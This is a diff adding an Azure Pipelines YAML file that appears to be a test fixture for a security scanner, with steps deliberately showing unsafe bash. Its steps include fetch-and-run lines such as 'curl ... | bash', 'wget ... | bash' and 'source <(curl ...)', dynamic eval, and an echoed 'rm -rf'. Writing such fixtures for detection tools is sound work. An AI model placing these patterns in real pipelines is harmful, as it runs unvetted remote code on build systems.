@@ -1,0 +1,30 @@
+# Test Pipeline - Bash Dangerous Patterns
+# This pipeline demonstrates dangerous bash usage
+
+trigger:
+- main
+
+pool:
+  vmImage: 'ubuntu-latest'
+
+steps:
+- script: |
+    # Dangerous bash patterns
+    eval "echo 'Dangerous eval'"
+    source <(curl -s https://example.com/script.sh)
+    exec "echo 'Dangerous exec'"
+    curl -s https://example.com/script.sh | bash
+    wget -qO- https://example.com/script.sh | bash
+  displayName: 'Dangerous Bash Script'
+
+- script: |
+    # More bash examples
+    command="echo 'Dynamic bash command'"
+    eval $command
+  displayName: 'Dynamic Bash Execution'
+
+- script: |
+    # Command injection examples
+    echo "ls -la"
+    echo "rm -rf /tmp/test"
+  displayName: 'Command Injection Test' 
